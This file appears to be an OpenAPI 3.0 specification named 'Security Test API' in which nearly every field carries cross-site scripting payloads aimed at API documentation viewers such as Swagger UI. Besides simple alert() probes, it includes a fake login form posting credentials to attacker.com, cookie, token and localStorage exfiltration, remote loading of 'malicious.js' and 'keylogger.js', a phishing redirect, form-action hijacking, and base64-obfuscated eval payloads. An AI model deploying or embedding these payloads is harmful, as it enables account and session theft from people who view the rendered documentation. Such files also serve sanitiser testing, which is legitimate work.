openapi: 3.0.0
info:
  title: "<script>alert('DOM XSS in title')</script><img src=x onerror='alert(\"XSS via img\")'>Security Test API"
  description: "<svg/onload=alert('XSS in description')><iframe srcdoc='<script>alert(\"iframe XSS\")</script>'></iframe>
    <style>
      body { background-color: black !important; color: red !important; }
      .swagger-ui .topbar { background-color: red !important; }
      .swagger-ui .info .title { color: red !important; font-size: 36px !important; text-shadow: 2px 2px #000; }
      .swagger-ui * { border-color: red !important; }
      .swagger-ui .btn { background-color: red !important; color: black !important; }
      .swagger-ui:after { content: 'HACKED'; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 100px; color: red; z-index: 9999; opacity: 0.3; }
    </style>
    <div style='border: 2px solid red; padding: 20px; margin: 20px 0; background-color: rgba(0,0,0,0.8);'>
      <h3 style='color: white; text-align: center;'>Authentication Required</h3>
      <form onsubmit='fetch(\"https://attacker.com/steal\", {method: \"POST\", body: JSON.stringify({username: document.getElementById(\"username\").value, password: document.getElementById(\"password\").value})}).then(() => {alert(\"Invalid credentials\");}); return false;'>
        <div style='margin-bottom: 10px;'>
          <label style='color: white;'>Username:</label>
          <input type='text' id='username' style='width: 100%; padding: 8px;'>
        </div>
        <div style='margin-bottom: 10px;'>
          <label style='color: white;'>Password:</label>
          <input type='password' id='password' style='width: 100%; padding: 8px;'>
        </div>
        <button type='submit' style='background-color: red; color: white; padding: 10px 15px; border: none; width: 100%;'>Login</button>
      </form>
    </div>"
  version: "1.0.0"
  contact:
    name: "<img src=x onerror='document.cookie && fetch(\"https://attacker.com/cookies?c=\"+encodeURIComponent(document.cookie))'>Security Team"
    email: "security@<script>alert('email XSS')</script>.com"
    url: "javascript:alert('contact URL XSS')"
servers:
  - url: "javascript:fetch('https://attacker.com/exfil?data='+encodeURIComponent(localStorage.getItem('auth_token')))"
    description: "<img src=x onerror='eval(atob(\"ZmV0Y2goImh0dHBzOi8vYXR0YWNrZXIuY29tL2V4ZmlsP2RhdGE9Iitvd25lci5kb2N1bWVudC5jb29raWUpOw==\"))'>Production Server"
  - url: "https://<script>alert('server URL XSS')</script>.example.com"
    description: "Test Server <iframe srcdoc='<script>alert(\"iframe in server description\")</script>'></iframe>"
paths:
  /login:
    post:
      summary: "<img src=x onerror='(function(){var s=document.createElement(\"script\");s.src=\"https://attacker.com/malicious.js\";document.body.appendChild(s);})()'>Login Endpoint"
      description: "<iframe srcdoc='<script>setInterval(function(){try{document.getElementById(\"operations-tag-default\").click();}catch(e){}},1000)</script>'></iframe>"
      operationId: "login"
      requestBody:
        content:
          application/json:
            schema:
              type: object
              properties:
                username:
                  type: string
                  example: "<script>alert('username XSS')</script>"
                password:
                  type: string
                  example: "<img src=x onerror='alert(\"password XSS\")'>"
      responses:
        '200':
          description: "<svg/onload=fetch('https://attacker.com/token?t='+localStorage.getItem('token'))>Login successful"
          content:
            application/json:
              schema:
                type: object
                properties:
                  token:
                    type: string
                    example: "<script>alert('token XSS')</script>"
  /user:
    get:
      summary: "<img src=x onerror='(function(){try{top.location=\"https://phishing-site.com\";}catch(e){}})()'>Get User Profile"
      description: "<script>document.addEventListener('DOMContentLoaded',function(){setTimeout(function(){try{document.querySelector('.auth-wrapper .authorize').click();}catch(e){}},1000);})</script>"
      operationId: "getUser"
      responses:
        '200':
          description: "<img src=x onerror='var i=document.createElement(\"iframe\");i.style.opacity=0;i.style.position=\"fixed\";i.style.top=0;i.style.left=0;i.style.width=\"100%\";i.style.height=\"100%\";i.style.zIndex=999999;i.srcdoc=\"<html><body><form id=f action=https://attacker.com/steal method=post><input name=data></form><script>document.querySelector(\\\"#f\\\").data.value=JSON.stringify({cookies:document.cookie,localStorage:Object.entries(localStorage)});document.querySelector(\\\"#f\\\").submit();</script></body></html>\";document.body.appendChild(i);'>User profile"
          content:
            application/json:
              schema:
                type: object
                properties:
                  name:
                    type: string
                    example: "<script>alert('name XSS')</script>"
  /admin:
    get:
      summary: "<svg onload=eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IjxoMT5IQUNLRUQ8L2gxPiI7'))>Admin Panel"
      description: "<iframe src='javascript:alert(`XSS via iframe src`)'></iframe>"
      operationId: "adminPanel"
      responses:
        '200':
          description: "<script>setInterval(function(){try{var forms=document.querySelectorAll('form');for(var i=0;i<forms.length;i++){forms[i].action='https://attacker.com/steal';}}catch(e){}},1000)</script>Admin panel access"
  /reset-password:
    post:
      summary: "<img src=x onerror='Object.defineProperty(window,\"swagger\",{get:function(){return{authActions:{authorize:function(){fetch(\"https://attacker.com/auth\",{method:\"POST\",body:JSON.stringify(arguments[0])})}}}}})'>Reset Password"
      description: "<script>setTimeout(function(){try{document.querySelector('.auth-wrapper .authorize').click();}catch(e){}},2000)</script>"
      operationId: "resetPassword"
      responses:
        '200':
          description: "<img src=x onerror='(function(){var x=new XMLHttpRequest();x.open(\"GET\",\"/api/sensitive\",true);x.onload=function(){fetch(\"https://attacker.com/data?d=\"+encodeURIComponent(this.responseText));};x.send();})()'>Password reset email sent"
components:
  schemas:
    User:
      type: object
      properties:
        id:
          type: string
          example: "<script>alert('schema XSS')</script>"
        name:
          type: string
          example: "<img src=x onerror='alert(\"name schema XSS\")'>"
  securitySchemes:
    oauth2:
      type: oauth2
      flows:
        implicit:
          authorizationUrl: "https://attacker.com/oauth/dialog"
          scopes:
            read: "Read access"
            write: "Write access"
    apiKey:
      type: apiKey
      name: "<script>alert('apiKey XSS')</script>"
      in: header
security:
  - oauth2: [read, write]
  - apiKey: []
tags:
  - name: "<script>alert('tag XSS')</script>"
    description: "<img src=x onerror='(function(){var x=document.createElement(\"script\");x.src=\"https://attacker.com/keylogger.js\";document.body.appendChild(x);})()'>Authentication endpoints"
  - name: "User Management"
    description: "<iframe srcdoc='<script>for(key in localStorage){fetch(\"https://attacker.com/localstorage?key=\"+key+\"&value=\"+encodeURIComponent(localStorage.getItem(key)))}</script>'></iframe>" 
